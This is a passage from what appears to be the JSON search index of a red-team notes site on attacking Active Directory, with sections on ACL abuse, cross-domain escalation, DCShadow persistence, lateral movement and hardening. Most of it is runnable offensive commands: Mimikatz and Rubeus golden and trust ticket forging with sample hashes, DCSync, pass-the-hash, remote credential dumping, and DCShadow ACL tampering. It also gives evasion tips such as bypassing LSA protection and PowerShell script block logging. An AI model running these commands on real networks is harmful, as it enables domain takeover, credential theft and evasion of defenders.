that allow them to be abused for account-takeover. Search ACLs of a principal. PowerView (dev): Get-DomainObjectAcl -Identity user | ? { $_.ActiveDirectoryRights -match \"GenericAll|WriteProperty|WriteDacl\" -and $_.SecurityIdentifier -match \"S-1-5-21-3263068140-2042698922-2891547269-[\\d]{4,10}\" } | select SecurityIdentifier, ActiveDirectoryRights | fl Search ACLs on the entire Domain. PowerView (dev): Get-DomainObjectAcl -SearchBase \"CN=Users,DC=dev,DC=cyberbotic,DC=io\" | ? { $_.ActiveDirectoryRights -match \"GenericAll|WriteProperty|WriteDacl\" -and $_.SecurityIdentifier -match \"S-1-5-21-3263068140-2042698922-2891547269-[\\d]{4,10}\" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl Reset User Password If we have GenericAll we can change the password of a user. net user bob Password! domain Modify Domain Group Membership We can add users to a group. net group \"Domain Admins\" bob add domain Set SPN (Kerberoasting) With enough privileges such as GenericAll or GenericWrite, a target user’s SPN can be set to anything which is unique in the domain. We can then request a TGS without special privileges and the TGS can be kerberoasted. We can enumerate the permissions for a group on ACLs: PowerView: Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match \"RDPUsers\"} We can also see if a user already has a SPN: PowerView (dev): Get-DomainUser -Identity user01 | select serviceprincipalname ADModule: Get-ADUser -Identity user01 -Properties ServicePrincipalName | select ServicePrincipalName And we can force the SPN to a user: PowerView (dev): Set-DomainObject -Identity user01 -Set @{serviceprincipalname='ops whatever01'} ADModule: Set-ADUser -Identity user01 -ServicePrincipalNames @{Add='ops whatever01'} Once we have a SPN set, we can request a TGS: Add-Type -AssemblyName System.IdentityModel New-Object Sytem.IdentityModel.Token.KerberosRequestorSecurityToken -ArgumentList \"ops whatever01\" And we can export the tickets to the disk: Inovoke-Mimikatz -Command '\"kerberos::list export\"' And finally same as Kerberoasting, you can crack the ticket with tgsrepcrack.py. Disable PreAuth of a User (ASREPRoasting) A user with GenericAll or GenericWrite, kerberos preauth can be disabled. PowerView (dev): Set-DomainObject -Identity user01 -XOR @{useraccountcontrol=4194304} -Verbose Across Domains (SID History) Domains in a same forest have an implicit two-way trust with other domains. There is a trust key between the parent and child domains. There are two ways of escalating privileges between two domains of the same forest: Trust Tickets Krbtgt hash Child to Parent using Trust Tickets We can escalate between domains using the trust tickets. An inter-realm TGT can be forged: Invoke-Mimikatz -Command '\"kerberos::golden user:Administrator domain:sub.corp.local sid:S-1-5-21-1874506631-3219952063-538504511 sids:S-1-5-21-280534878-1496970234-700767426-519 rc4:05749eb179dbf3d3445e0a49d6701578 service:krbtgt targe t:corp.local ticket:C:\\temp\\trust_forest_tkt.kirbi\"' We are going to inject the SID History inse the inter-realm TGT which will be requestes to the parent domain DC. The ticket will look like that comes from the Enterprise Admins group which allows us to elevate privileges. Invoke-Mimikatz Parameter Description domain:sub.corp.local Current Domain FQDN sid:S-1-5-21-268341927-4156873456-1784235843 Current Domain SID sids:S-1-5-21-280534878-1496970234-700767426-519 SID of Enterprise Admins group (Parent Domain) rc4:05749eb179dbf3d3445e0a49d6701578 RC4 of the trust key (parent$) user:Administrator User to impersonate service:krbtgt Target service in the parent domain target:corp.local Parent Domain FQDN tiket:C:\\Windows\\Temp\\trust_tkt.kirbi File to store the ticket Once we have the inter-realm TGT ticket forged we can ask for a TGS on the parent domain. We can ask a TGS for LDAP on the parent DC. asktgs.exe (kekeo_old) .\\asktgs.exe . trust_tkt.kirbi LDAP corp-dc.corp.local Rubeus.exe .\\Rubeus.exe asktgs ticket:trust_tkt.kirbi dc:corp-dc.corp.local service:LDAP corp-dc.corp.local ptt Finally we can inject in on the current session: .\\Rubeus.exe ptt ticket:LDAP.mcorp-dc.moneycorp.local.kirbi And execute a DCSync attack and Over-Pass-The-Hash to fully control the DC of the parent domain: Invoke-Mimikatz -Command '\"lsadump::dcsync user:mcorp\\Administrator domain:moneycorp.local\"' .\\Rubeus.exe asktgt domain:corp.local user:Administrator rc4:71d04f9d50ceb1f64de7a09f23e6dc4c dc:corp-dc.moneycorp.local ptt Enter-PSSession -ComputerName corp-dc.moneycorp.local Child to Parent using krbtgt hash We can also escalate to the root domain with the krbtgt hash of the current domain. Invoke-Mimikatz -Command '\"kerberos::golden user:Administrator domain:sub.corp.local sid:S-1-5-21-1874506631-3219952063-538504511 sids:S-1-5-21-280534878-1496970234-700767426-519 krbtgt:a9b30e5b0dc865eadcea9411e4ade72d ticket:C:\\temp\\trust_forest_tkt.kirbi\"' Invoke-Mimikatz Parameter Description domain:sub.corp.local Current Domain FQDN sid:S-1-5-21-268341927-4156873456-1784235843 Current Domain SID sids:S-1-5-21-280534878-1496970234-700767426-519 SID of Enterprise Admins group (Parent Domain) user:Administrator User to impersonate krbtgt:a9b30e5b0dc865eadcea9411e4ade72d krbtgt hash of Current Domain tiket:C:\\Windows\\Temp\\trust_tkt.kirbi File to store the ticket Once created we can import and we don’t need to ask for a TGS. .\\Rubeus.exe ptt ticket:trust_forest_tkt.kirbi Invoke-Mimikatz -Command '\"lsadump::dcsync user:mcorp\\Administrator domain:moneycorp.local\"' Avoid Suspicious logs by using DC machine accounts. Invoke-Mimikatz -Command '\"kerberos::golden user:DCORP-DC$ domain:dollarcorp.moneycorp.local sid:S-1-5-21-268341927-41456871508-1792461683 groups:516 sids:S-1-5-21-560323961-2032768757-2425134131-516,S-1-5-9 krbtgt:a9b30e5b0dc865eadcea9411e4ade72d ptt\"' RedTeam Notes: Avoid suspicious logs adding groups:516 sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9 S-1-5-21-280534878-1496970234-700767426-516 - Domain Controllers S-1-5-9 - Enterprise Domain Controllers It can also bee possible with a Diamond Ticket and rubeus. .\\Rubeus.exe diamond tgtdeleg ticketuser:Administrator tickeruserid:500 groups:512 sids:S-1-5-21-560323961-2032768757-2425134131-512 krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa nowrap SID Filtering (Defending) SID Filtering avoids attacks which abuses SID history attribute across forest trust. By default SID Filtering is enabled on all inter-forests trusts. Intra-Forests trusts are assumed secured by default. But, since SID Filtering has potential to break applications and user access, it is often disabled. Microsoft considers a forest and no the domain to be a security boundary so its disabled by default. ParentChild Trust -&gt; Disabled External Trust -&gt; Enabled Selective Authentication (Defending) In an inter-forest trust (External Trust), if Selective Authentication is configured, users between the trusts will not be automatically authenticated. Individual access to domains and servers in the trusting domain forest should be given."
					}

					
				
			
		
			
				
					,
					

					"active-directory-forest-persistence": {
						"id": "active-directory-forest-persistence",
						"title": "Forest Persistence",
						"category": "",
						"url": " /active-directory/forest-persistence/",
						"content": "We are going to discuss some ways to do a persistence in a forest root. DCShadow DCShadow temporaly registers a new DC in the target domain and uses it to push attributes like SID History, SPNs and more over on the specified object without leaving the cange logs for modified object. The new domain controller is registered by modifying the configuration container, SPNs of an exisiting computer object and couple of RPC services. Due to the attributes are changed from a domain dontroller, there are no change logs on the actual DC for the target object. By default, domain administrative privileges are required to use DCShadow. To execute this persistence we need to use two isntances of mimikatz. The first one starts RPC servers with SYSTEM privileges and specify attributes to be modified: mimikatz.exe !+ !processtoken lsadump::dcshadow object:root1user attribute:Description value=\"Hello from DCShadow\" And the second one with enough privileges, such as DA, will push the values: privilege::debug sekurlsa::pth userAdministrator domain:corp.local ntlm:71d04f9d50ceb1f64de7a09f23e6dc4c impersonate lsadump::dcshadow push Note: DCShadow can be used with minimal permissions by modifyng ACLs, Nishang has a script to set this permissions to a user. Set-DCShadowPermissions -FakeDC machine-user01 -SAMAccountName root1user -Username user01 -Verbose Set Primary Group ID to Enterprise Admin Now that we have been discovered how to overwrite attributes of users, we can change the group id of a user to the id of the enterprise administrators or domain admins. lsadump::dcshadow object:user01 attribute:primaryGroupID value:519 Note: This makes noise, because every one who looks net group \"Enterpise Admins\" domain will see that the user user01 is a member. Change SIDHistory of a user We can modify the SIDHistory of a user with SID of Enterprise Admins group in order to obtain full control of the forest. lsadump::dcshadow object:user attribute:SIDHistory value:S-1-5-21-280534878-1496970234-700767426-519 Modify ntSecurityDescriptor for AdminSDHolder We can modify the ntSecurityDescriptor for AdminSDHolder to add full control for a user. (New-Object System.DirectoryServices.DirectoryEntry(\"LDAP: CN=AdminSDHolder,CN=System,DC=corp,DC=local\")).psbase.ObjectSecurity.sddl We just need to append a full control ACE from above DA with our users SID. lsadump::dcshadow object:CN=AdminSDHolder,CN=System,DC=corp,DC=local attribute:ntSecurityDescriptor value:&lt;MODIFIED ACL&gt; Modified ACL: ORIGINAL ACL + FULL CONTROL FOR OUR USER ....(A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;S-1-5-21-560323961-2315414123-15432421423-1323) Note: We just need to add our SID to the SY BA DA ACE result. To see the SID we can use: Get-NetUser user01 Shadowception We can even run DCShadow from DCShadow. To do that task we will add the following ACLs: (New-Object System.DirectoryServices.DirectoryEntry(\"LDAP: DC=corp,DC=local\")).psbase.ObjectSecurity.sddl Note We can use stack to stack multiple ACL. Domain Object List ACL: (New-Object System.DirectoryServices.DirectoryEntry(\"LDAP: DC=corp,DC=local\")).psbase.ObjectSecurity.sddl Append the following ACE: (OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;&lt;USER SID&gt;) (OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;&lt;USER SID&gt;) (OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;&lt;USER SID&gt;) Stack the ACL lsadump::dcshadow stack object:DC=corp,DC=local attribute:ntSecurityDescriptor value:&lt;MODIFIED ACL&gt; Attacker Computer Object List ACL: (New-Object System.DirectoryServices.DirectoryEntry(\"LDAP: CN=machine01,DC=corp,DC=local\")).psbase.ObjectSecurity.sddl Append the following ACE: (A;;WP;;;&lt;USER SID&gt;) Stack the ACL lsadump::dcshadow stack object:machine01$ attribute:ntSecurityDescriptor value:&lt;MODIFIED ACL&gt; Target User Object List ACL: (New-Object System.DirectoryServices.DirectoryEntry(\"LDAP: CN=user01,DC=corp,DC=local\")).psbase.ObjectSecurity.sddl Append the following ACE: (A;;WP;;;&lt;USER SID&gt;) Stack the ACL lsadump::dcshadow stack object:targetuser01 attribute:ntSecurityDescriptor value:&lt;MODIFIED ACL&gt; Sites Configuration Object List ACL: (New-Object System.DirectoryServices.DirectoryEntry(\"LDAP: CN=Sites,CN=Configuration,DC=corp,DC=local\")).psbase.ObjectSecurity.sddl Append the following ACE: (A;CI;CCDC;;;&lt;USER SID&gt;) Stack the ACL lsadump::dcshadow stack object:CN=Sites,CN=Configuration,DC=corp,DC=local attribute:ntSecurityDescriptor value:&lt;MODIFIED ACL&gt; Finally we just start the server: lsadump::dcshadow And on the other session with DA privileges: lsadump::dcshadow push"
					}

					
				
			
		
			
				
					,
					

					"active-directory-introduction": {
						"id": "active-directory-introduction",
						"title": "Basics",
						"category": "",
						"url": " /active-directory/introduction/",
						"content": "Methodology After pwning a Machine Invoke-Mimikatz for dumping secrets. Look for interesting internal files. After pwning a User Find where the user has local admin privileges. Find-WMILocalAdminAccess.ps1 and Invoke-UserHunter -CheckAccess Find new shares. Invoke-ShareFinder -ExcludeStandard Check ACLs for the User. Get-ObjectAcl -ResolveGUIDs | ?{$_.IdentityReference \"*USER*\"} Check ACL for the Groups where the user is member. Get-ObjectAcl -ResolveGUIDs | ?{$_.IdentityReference \"*GROUP*\"} Find new MSSQL Access. Import-Module PowerUpSql.psd1; Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose What is Active Directory? An Active Directory (AD) is a system that allows to manage a set of computers and users connected in the same network from a central server. Active Directory allows this by maintaining a centralized database where all the information about users, computers, policies, permissions, etc, is stored. So, for example, the IT team can connect to this database and create the new users for the interns and assign permissions to them to be only allowed to read files in the indicated directories of the specific servers of their departments. An Active Directory is installed on Windows Servers. Let’s see their items. Note: Be careful with Clock Skew, Kerberos uses a synchronous process because use datetime to hash the tickets. Maybe you need to synchronize your date on your system with the DC. On Linux: rdate -n &lt;DC_IP&gt; Domain We usually known an Active Directory as a Domain. A domain is a set of connected computers that shares an active directory database which is managed by the central servers called Domain Controllers (DC). Every domain has a DNS name, a NetBIOS name (usually the dns name without the last part), a SID (Security Identifier) and more… PS C:\\Users\\Administrator&gt; Get-ADDomain AllowedDNSSuffixes : {} ChildDomains : {} ComputersContainer : CN=Computers,DC=corpme,DC=local DeletedObjectsContainer : CN=Deleted Objects,DC=corpme,DC=local DistinguishedName : DC=corpme,DC=local DNSRoot : corpme.local DomainControllersContainer : OU=Domain Controllers,DC=corpme,DC=local DomainMode : Windows2016Domain DomainSID : S-1-5-21-2476192797-718363329-2951282162 ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=corpme,DC=local Forest : corpme.local InfrastructureMaster : DC01.corpme.local LastLogonReplicationInterval : LinkedGroupPolicyObjects : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=corpme,DC=loca l} LostAndFoundContainer : CN=LostAndFound,DC=corpme,DC=local ManagedBy : Name : corpme NetBIOSName : CORPME ObjectClass : domainDNS ObjectGUID : b113666c-e88e-47d5-be33-5a752d0d7c73 ParentDomain : PDCEmulator : DC01.corpme.local PublicKeyRequiredPasswordRolling : True QuotasContainer : CN=NTDS Quotas,DC=corpme,DC=local ReadOnlyReplicaDirectoryServers : {} ReplicaDirectoryServers : {DC01.corpme.local} RIDMaster : DC01.corpme.local SubordinateReferences : {DC=ForestDnsZones,DC=corpme,DC=local, DC=DomainDnsZones,DC=corpme,DC=local, CN=Configuration,DC=corpme,DC=local} SystemsContainer : CN=System,DC=corpme,DC=local UsersContainer : CN=Users,DC=corpme,DC=local Forest Active Directory offers many ways to organize your infraestructure. An organitzation can use domain and subdomains in order to organize the object via departmants, countries, etc… PS C:\\Users\\Administrator&gt; Get-ADForest ApplicationPartitions : {DC=ForestDnsZones,DC=corpme,DC=local, DC=DomainDnsZones,DC=corpme,DC=local} CrossForestReferences : {} DomainNamingMaster : DC01.corpme.local Domains : {corpme.local} ForestMode : Windows2016Forest GlobalCatalogs : {DC01.corpme.local} Name : corpme.local PartitionsContainer : CN=Partitions,CN=Configuration,DC=corpme,DC=local RootDomain : corpme.local SchemaMaster : DC01.corpme.local Sites : {Default-First-Site-Name} SPNSuffixes : {} UPNSuffixes : {} In a forest each domain has its own database and its own domain controllers. Note: A user of a domain in the forest can also access to the other domains of the same forest. Functional Modes As well as Windows computers, domains forest can also have their own “version”, that is called functional mode. Depending on the mode of the domain forest, new characteristics can be used. The modes are named based on the minimum Windows Server operative system required to work with them. There are the following functional modes: Windows2000 Windows2000MixedDomains Windows2003 Windows2008 Windows2008R2 Windows2012 Windows2012R2 Windows2016 PS C:\\Users\\Administrator&gt; (Get-ADForest).ForestMode Windows2016Forest Then if, for example, you find a domain forest with Windows2012 mode, you can know that all the Domain Controllers are at least Windows Server 2012. You must be aware of the mode in order to use some characteristics of the domain, for example, the Protected Users group requires a Windows2012R2 mode. Trusts In an active directory environment, trust is a relationship between two domains or forests which allows users of one domain or forest to access resources in the other domain or forest. Trust can be automatic for example parent-child, same forest, etc… or established manually. Trusted Domain Objects (TDOs) the trust relationship in a domain. Directions of Trust Exist diferent directions of Trust: One-Way Trust: It is unidirectional. Users in the trusted domain can access resources in the trusting domain but not backwards. ** Outgoing trust: Allows users of the other domain access to your domain. ** Incoming trust: Allows users of your domain to access the other domain. Two-Way Trust: It is bidirectional. Users of both domains can access resources in the other domain Trust Transitivity Exist different types of transitivity on a domain: Transitive: Transitivie is a property of trust which means that the trust can be extended to etablish trust relationships with other domains. All the default intra-forest trust relationships such as Tree-Root or Parent-Child between domains within a same forest are transitive Two-Way trusts. Means that Domain A trusts Domain B and Domain B trusts Domain C so Domain A also trusts Domain C in a Two-Way Trust direction. Nontransitive: Nontransitive means that the trust can not be extended to other domains in the forest, we can find it on a two-way or one-way. This is the default trust called external trust between two domains in different forests, when forests do not have a trust relationship. Type of Trusts There are many types of trusts: Parent-Child: It is created automatically between the new domain an the domain that precedes it (parent-child trust) in the namespace hierarchy, whenever a domain is added in a tree. For example lab.corp.local is a child of corp.local. Always the trust is in a two-way transitive. Tree-Root: It is created automatically between whenever a new domain tree is added to a forest root. The trust is always two-way transitive. Shortcut: The shortcut trust is used to reduce access times in a complex trust scenarios. We can found it in a one-way or two-way transitive form. External: An external trust gives the opportunity of trust between two domains in different forests which do not have any trust relationship. Can be one-way or two-way and is nontransitive. Realm: A special trust to connect Active Directory and a non-Windows domain. Forest: A trust is a connection from a domain to another. Not a physical network connection, but a kind of authentication authorization connection. You may be able to reach computers on the network that are in others domains, but you cannot log in on those computers with your user of this domain. That is what a trust allows you to do. Forest trust is a trust between forest root domains. Cannot be extended to a third forest so has no implicit trust. Can be one-way or two-way and transitive or nontransitive. Note: In case of nonsensitvie Forest 1 would not have any type of trust relationship with Forest 3. Trust Key Technically, when you use a trust, there is a communication between the domain controller of your domain and the domain controller of the target domain (or of an intermediary domain). How communication is made varies depending of the protocol that is being used (which could be NTLM, Kerberos, etc), but in any case, the domain controllers needs to share a key to keep the communications secure. This key is known as the trust key and it’s created when the trust is established. When a trust is created, a trust account is created in the domain database as if it were an user (with the name finished in $). The trust key is then stored as if it was the password of the trust user (in the NT hash and Kerberos keys). A trust ticket is a key which a DC of the other forest uses to decrypt the TGT presented by the attacker. That is the only check. We are going to execute a similar attack such as golden ticket but using the trust ticket instead of the krbtgt hash. To list the Trust tickets we can use mimikatz: Invoke-Mimikatz -Command '\"lsadump::trust patch\"' Invoke-Mimikatz -Command '\"lsadump::dcsync user:dcorp\\mcorp$\"' Users References https: zer1t0.gitlab.io posts attacking_ad"
					}

					
				
			
		
			
				
					,
					

					"active-directory-lateral-movement": {
						"id": "active-directory-lateral-movement",
						"title": "Lateral Movement",
						"category": "",
						"url": " /active-directory/lateral-movement/",
						"content": "PowerShell Remoting Once a machine is compromised, we need to jump to others in order to find more valuable targets. For that task we can use PowerShell Remoting which is increasingly used in enterprises and enabled by default on Server 2012 onwards. PowerShell Remoting uses WinRM protocol, so you can check evil-winrm tool. Admin privileges on the target machineis needed. Note: Maybe you need to enable remoting Enable-PSRemoting on a Desktop windows machine and Admin privs are required. You can get a elevated shell (NT AUTHORITY\\SYSTEM) on the remote server if the credentials of the user administrator are used to authenticate (default setting). Using Credentials We can use other credentials: $user='WORKGROUP\\User'; $pass='passwd'; $cred = (New-Object System.Management.Automation.PSCredential $user,(ConvertTo-SecureString $pass -AsPlainText -Force)) And use it with the parameter -Credential Note: If password is not declared a prompt will be shown in order to enter manually. Creating a Session There are two types of PowerShell Remoting: One-to-One: It is interactively login to another machine. Create a new session on the target machine so runs in a new process (wsmprovhost). Enter-PSSession -ComputerName machine01.corp.local Enter-PSSession -ComputerName machine01.corp.local -Credential $cred Enter-PSSession -ComputerName machine01.corp.local -Credential corp\\user We can also first create the session and append to it later. $sess = New-PSSession -ComputerName machine01.corp.local Enter-PSSession -Session $sess Note: We can put a session in background if the session is stored in a variable. Very useful. One-to-Many: It is also known as Fan-out remoting. It is a non-interactive shell but we can execute commands parallely. Is useful to run commmands and scripts on multiple remote computers, in disconnected sessions and as a background job. Invoke-Command -ComputerName machine01.corp.local -ScriptBlock {whoami;hostname} Invoke-Command -ComputerName (Get-Content .\\servers.txt) Invoke-Command -ComputerName machine01.corp.local -FilePath .\\file.ps1 Note: One of the best things in PowerShell to do PassTheHash, using credentials and executing commands on multiple remote computers. RedTeam Note: Since admin privs are needed is a useful tool to check if the user has admin privs on the target machine. Execute locally loaded funcitons on the remote machine We can execute locally loaded function on the remote machine. Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content .\\servers.txt) Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ArgumentList \"-List hello\" -ComputerName (Get-Content .\\servers.txt) Load a script remotely we can load a script remotely. Invoke-Command -FilePath .\\hello.ps1 -Session $sess Enter-PSSession -Session $sess [machine01.corp.local]: PS C:\\&gt; hello Hello World! Execute “Stateful” commands We can execute “Stateful” commands. $sess = New-PSSession -ComputerName server1 Invoke-Command -Session $sess -ScriptBlock {$proc = Get-Process} Invoke-Command -Session $sess -ScriptBlock {$proc.Name} Transfering files We can also transfer files with PSRemoting and Copy-Item $sess = New-PSSession -ComputerName server1 Copy-Item C:\\Windows\\remote_file.txt C:\\Windows\\local_file.txt -FromSession $sess Copy-Item C:\\Windows\\local_file.txt C:\\Windows\\remote_file.txt -ToSession $sess Dump credentials Once we have administrator privileges on the target machine we can dump credentials with Invoke-Mimikatz. See this section: https: mvc1009.github.io hackingnotes post-exploitation get-credentials . To avoid save mimikatz on disk we need to load remotely. Invoke-Command -FilePath .\\Invoke-Mimikatz.ps1 -Session $sess Invoke-Command -Session $sess -ScriptBlock {Invoke-Mimikatz -DumpCreds} Or we can execute locally loaded functions. . .\\Invoke-Mimikatz.ps1 Invoke-Command -Session $sess -ScriptBlock {function:Invoke-Mimikatz -DumpCreds} Over-Pass-the-Hash Pass-The-Key Abusing kerberos functionality we can execute commands as another user by only knowing the NTLM hash. Invoke-Mimikatz Invoke-Mimikatz -Command '\"sekurlsa::pth user:Administrator domain:corp.local ntlm:&lt;ntlmhash&gt; run:powershell.exe\"' RedTeam Note: There is a different in encryption type for timestamp between a normal krb-as-req and one using the Over-Pass-the-hash krb-as-req Over-Pass-the-hash krb-as-req etype flag: eTYPE-ARCFOUR-HMAC-MD5 (23) Normal krb-as-req etype flag: eTYPE-AES256-CTS-HMAC-SHA1-96 (18) To reduce the cahnces of detection use aes256, aes128 and NTLM(RC4) together. Invoke-Mimikatz -Command '\"sekurlsa::pth user:Administrator domain:corp.local aes256:&lt;aes256&gt; aes128:&lt;aes128&gt; ntlm:&lt;ntlmhash&gt; run:powershell.exe\"' Rubeus .\\Rubeus.exe asktgt domain:dollarcorp.moneycorp.local user:srvadmin rc4:a98e18228819e8eec3dfa33cb68b0728 ptt Pass-The-Ticket We can use the tickets that are save to a .kirbi file. Invoke-Mimikatz Invoke-Mimikatz -Command '\"kerberos::ptt ticket.kirbi\"' Rubeus .\\Rubeus.exe ptt ticket:ticket.kirbi .\\Rubeus.exe ptt ticket:&lt;base64ticket&gt; Manipulating User Passwords with Mimikatz Mimikatz supports the ability to manipulate user password, so we can change the password to a new one and restore it later. Invoke-Mimikatz -Command '\"lsadump::changentlm server:dc01 user:jeff old:&lt;NTLM&gt; newpassword:&lt;NTLM2&gt;\"' Invoke-Mimikatz -Command '\"lsadump::setntlm server:dc01 user:jeff ntlm:&lt;NTLM&gt;\"' https: stealthbits.com blog manipulating-user-passwords-with-mimikatz"
					}

					
				
			
		
			
				
					,
					

					"active-directory-securing-ad": {
						"id": "active-directory-securing-ad",
						"title": "Hardening Active Directory",
						"category": "",
						"url": " /active-directory/securing-ad/",
						"content": "In this section some detection, defense tools and security advisors are going to be discussed. Protect Limit Domain Admins It is recommended to protect and limit domain admins: Reduce the number of Domain Admins. Do not allow or limit the login of DAs to any other machine rather than the Domain Controllers. In case of need it, ensure that there are no other local machine on the target. Try to never run a service with a Domain Admin (Service Accounts passwords are stored in LSAS and no protections are setted). Set Account is sensitive and cannot be delegated for Domain Admins. Windows Defender Microsoft Defender Antivirus is available in Windows 10 and Windows 11, and in versions of Windows Server. Microsoft Defender Antivirus is a major component of your next-generation protection in Microsoft Defender for Endpoint. This protection brings together machine learning, big-data analysis, in-depth threat resistance research, and the Microsoft cloud infrastructure to protect devices (or endpoints) in your organization. Microsoft Defender Antivirus is built into Windows, and it works with Microsoft Defender for Endpoint to provide protection on your device and in the cloud. It has three different modes: Active mode: In active mode, Microsoft Defender Antivirus is used as the primary antivirus app on the device. Files are scanned, threats are remediated, and detected threats are listed in your organization’s security reports and in your Windows Security app. Passive mode: In passive mode, Microsoft Defender Antivirus is not used as the primary antivirus app on the device. Files are scanned, and detected threats are reported, but threats are not remediated by Microsoft Defender Antivirus. IMPORTANT: Microsoft Defender Antivirus can run in passive mode only on endpoints that are onboarded to Microsoft Defender for Endpoint. Disabled or uninstalled: When disabled or uninstalled, Microsoft Defender Antivirus is not used. Files are not scanned, and threats are not remediated. In general, we do not recommend disabling or uninstalling Microsoft Defender Antivirus. More info in: https: docs.microsoft.com en-us microsoft-365 security defender-endpoint microsoft-defender-antivirus-windows?view=o365-worldwide LSA Protection In Windows 8.1 and later microsoft has provided addition protection for the LSA to prevent untrusted processes from being able to read its memory or inject code. This will prevent mimikatz sekurlsa::logonpasswords for working properly. To activate this protection set to 1 the value of RunAsPPL: reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\LSA v RunAsPPL reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\LSA v RunAsPPL t REG_DWORD d 1 This LSA protection can be bypass using mimikatz mimidrv.sys driver: mimikatz # !+ mimikatz # !processprotect process:lsass.exe remove Disable WDigest Windows Digest (WDigest) is a authentication protocol introduced in Windows XP and was designed to be used with HTTP protocol which means that plain-text passwords are stored in the LSASS. Invoke-Mimikatz -Command '\"sekurlsa::wdigest\"' This behaviour can be disabled via registry setting to 1 the value of UseLogonCredential and Negotiate reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest v UseLogonCredential reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest v UseLogonCredential t REG_DWORD d 1 reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest v Negotiate t REG_DWORD d 1 Note: Microsoft has this protocol enabled by default in Windows XP, Windows 8.0, Windows Server 2003 and Windows Server 2012. LAPS LAPS (Local Administrator Password Solution) is a centralized storage of passwords for local administrator in active directory with a periodic randomizing where read permissions are access controlled. Computer objects where LAPS is activated has two new attributes: ms-mcs-AdmPwd attribute stores the clear text pasword. ms-mcs-AdmPwdExpitarionTime controls the password change. Although the password is stored in clear text, te transmission is encrypted. With careful enumeration, it is possible to retrieve which users can access the clear text password providing a list of attractive targets. More info in: https: docs.microsoft.com es-es defender-for-identity cas-isp-laps Credential Guard Credential Guard or Windows Defender Credential Guard is a new feature in Windows 10 Entreprise and Education edition and Windows Server 2016 that helps to protect your credentials on a machine from threats such as PassTheHash or Over-PassTheHash by restricting access to NTLM hashes and TGTs. It uses virtualization based security to isolate secrets so that only privileges system software can access them. Credential Guard must be turned on and deployed in your organization as it is not enabled by default. Since it is activated it is no posible to access the secrets in LSASS. Note: During the PassTheHash technique we write on LSASS. To check if Credential Guard is enabled check the following registry: reg query HKLM\\System\\CurrentControlSet\\Control\\LSA v LsaCfgFlags Credential Guard could be enabled in different ways: Value Mode 0 Disabled 1 Enabled with UEFI lock 2 Enabled without UEFI lock Credentials for local accounts in SAM and Service Account Credentials from LSA Secrets are not protected. BlueTeam Note: Credential Guard cannot be enabled on a DC because it breaks the authentication. More info in: https: docs.microsoft.com es-es windows security identity-protection credential-guard credential-guard-manage AppLocker AppLocker is a Windows Defender functionallity which helps you control which apps and files users can run. These include executable files, scripts, Windows Installer files, dynamic-link libraries (DLLs), packaged apps, and packaged app installers. AppLocker can help you: Define rules based on file attributes that persist across app updates, such as the publisher name (derived from the digital signature), product name, file name, and file version. You can also create rules based on the file path and hash. Assign a rule to a security group or an individual user. Create exceptions to rules. For example, you can create a rule that allows all users to run all Windows binaries, except the Registry Editor (regedit.exe). Use audit-only mode to deploy the policy and understand its impact before enforcing it. Create rules on a staging server, test them, then export them to your production environment and import them into a Group Policy Object. Simplify creating and managing AppLocker rules by using Windows PowerShell. Powershell 5.1 Upgrade to Windows PowerShell 5.1, this offers multiple security controls which certainly increase the costs to attacker. Whitelisting Use Application Control Policies (Applocker) and Device Guard to restrict PowerShell scripts. If Applocker is configured in “Allow mode” for scripts, Powershell 5 automatically uses the Constrained Language Mode. Bypass Whitelisting If PowerShell is blocked, .NET code can use System.Management.Automation NameSpace to load PowerShell functionality. C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319&gt;msbuild.exe pshell.xml Enhanced Logging Enhanced Logging allows BlueTeams to have a very in-depth look of an attacker’s activities if he is using PowerShell. Warning level script block logging only for a known list of suspicious commands. A large number of logs for script block logging is created. Even more if invocation of script blocks is logged. A huge number of logs when module logging is enabled. Script Block Logging Set EnableSciptBlockLogging to 1 in the following registry: HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging PowerShell v5 onwards logs (Warning level Event ID 4104) some suspicious script blocks automatically based on a list of suspicious commands. https: github.com PowerShell PowerShell blob v6.0.0-alpha.18 src System.Management.Automation engine runtime CompiledScriptBlock.cs#L1612-L1660 It also records the original obfuscated code as well decoded and deobfuscated code. Module Logging Available since PowerShell v3, module logging logs pipeline execution and command execution events. Can be enabled using GPO, use * to log all modules: Administrative Templates -&gt; Windows Components -&gt; Windows PowerShell -&gt; Turn on Module Logging We can also modify the registry. Set EnableModuleLogging to 1: HKLM\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging And create a key * and set it to * for all modules. HKLM\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging\\ModuleNames Bypass Script Block Logging Script Block logging can be bypassed on the current session without admin rights by disabing it from the Group Policy Cache. $GroupPolicyField=[ref].Assembly.GetType('System.Management.Automation.Utils').\"GetFie`ld\"('cachedGroupPolicySettings','N'+'onPublic,Static')If($GroupPolicyField) {$GroupPolicyCache=$GroupPolicyField.GetValue($null)If($GroupPolicyCache['ScriptB'+'lockLogging']) 